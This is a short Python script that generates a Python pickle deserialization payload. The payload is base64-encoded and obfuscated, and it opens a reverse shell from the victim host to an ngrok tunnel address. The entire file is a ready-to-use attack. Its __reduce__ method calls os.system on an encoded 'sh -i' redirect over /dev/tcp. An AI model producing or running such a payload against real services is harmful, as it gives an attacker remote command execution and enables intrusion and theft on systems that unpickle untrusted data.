import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ("echo 'c2ggLWkgPiYgL2Rldi90Y3AvMC50Y3AuYXAubmdyb2suaW8vMTc4MTYgMD4mMQ=='|base64 -d|bash")
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
